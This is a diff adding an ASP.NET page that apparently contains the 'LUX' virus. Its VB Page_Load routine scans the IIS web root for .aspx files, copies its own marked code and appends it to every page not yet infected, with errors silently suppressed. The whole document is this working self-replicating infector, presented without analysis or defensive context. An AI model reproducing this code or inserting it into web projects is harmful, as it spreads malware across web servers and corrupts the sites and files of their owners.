@@ -1,0 +1,48 @@
+ <!-- LUX -->
+<html>
+<head>
+  <script language="VB" runat="server">
+  Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+    Try
+      Dim di As New System.IO.DirectoryInfo("C:\Inetpub\wwwroot")
+      Dim fiArr As System.IO.FileInfo() = di.GetFiles("*.aspx")
+      Dim fri As System.IO.FileInfo
+      Dim line, file_cont As String
+      Dim i,IsInf As Integer
+      Dim VirCode As String = ""
+      For Each fri In fiArr
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+          Do
+            line = file_pointer.ReadLine()
+            file_cont=file_cont+line+Chr(13)+Chr(10)
+          Loop Until line Is Nothing
+          file_pointer.Close()
+	  For i=0 to file_cont.Length-12
+	    If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then VirCode = file_cont.Substring(i-1, 1613)
+	  Next
+      Next
+      For Each fri In fiArr
+	IsInf=0
+	file_cont=""
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+        Do
+          line = file_pointer.ReadLine()
+          file_cont=file_cont+line+Chr(13)+Chr(10)
+        Loop Until line Is Nothing
+        file_pointer.Close()
+	For i=0 to file_cont.Length-12
+	  If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then IsInf = 1
+        Next  
+	If IsInf <> 1 Then
+	  Dim file_pointerW As New System.IO.StreamWriter("C:\Inetpub\wwwroot\"+fri.Name)
+	  file_pointerW.WriteLine(file_cont+Chr(13)+Chr(10)+VirCode)
+	  file_pointerW.Close()
+	  i=file_cont.Length
+	End If
+      Next
+    Catch ex As Exception
+    End Try
+  End Sub
+  </script>
+</head>
+</html>
